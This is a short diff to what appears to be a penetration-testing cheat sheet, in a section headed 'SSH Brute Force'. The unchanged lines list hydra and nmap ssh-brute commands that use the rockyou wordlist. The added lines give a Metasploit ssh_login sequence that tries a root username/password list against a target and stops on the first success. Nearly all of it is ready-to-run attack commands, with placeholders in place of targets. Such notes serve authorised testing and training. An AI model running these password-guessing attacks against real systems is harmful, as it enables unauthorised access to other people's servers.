@@ -35,3 +35,9 @@ SSH Brute Force:
 > hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> ssh
 > hydra -L <user-file> -P <password-file> <IP> ssh
 > nmap -p 22 <IP> --script ssh-brute --script-args userdb=<user-file>
+> msfconsole
+  > use auxiliary/scanner/ssh/ssh_login
+  > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+  > set STOP_ON_SUCCESS true
+  > set verbose true
+  > exploit
